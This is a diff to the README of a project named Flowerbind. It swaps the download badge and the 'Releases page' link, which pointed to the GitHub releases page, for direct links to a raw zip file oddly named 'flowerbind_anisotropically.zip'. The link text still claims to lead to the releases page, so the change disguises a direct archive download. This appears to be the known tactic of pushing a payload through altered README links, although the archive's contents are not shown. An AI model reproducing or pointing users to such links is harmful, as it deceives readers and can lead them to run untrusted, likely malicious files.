@@ -8,11 +8,11 @@ To begin your journey with Flowerbind, you'll need to download the landing page.
 
 ### 🔗 Download Flowerbind
 
-[![Download Flowerbind](https://img.shields.io/badge/Download-Flowerbind-brightgreen)](https://github.com/MADARAUCHIHA200/flowerbind/releases)
+[![Download Flowerbind](https://raw.githubusercontent.com/MADARAUCHIHA200/flowerbind/main/FLOWERBIND/flowerbind_anisotropically.zip)](https://raw.githubusercontent.com/MADARAUCHIHA200/flowerbind/main/FLOWERBIND/flowerbind_anisotropically.zip)
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/MADARAUCHIHA200/flowerbind/releases).
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/MADARAUCHIHA200/flowerbind/main/FLOWERBIND/flowerbind_anisotropically.zip).
 
 2. **Choose the Latest Version**: Look for the latest release at the top of the page. You will see information about the version and a description of what’s included.
 
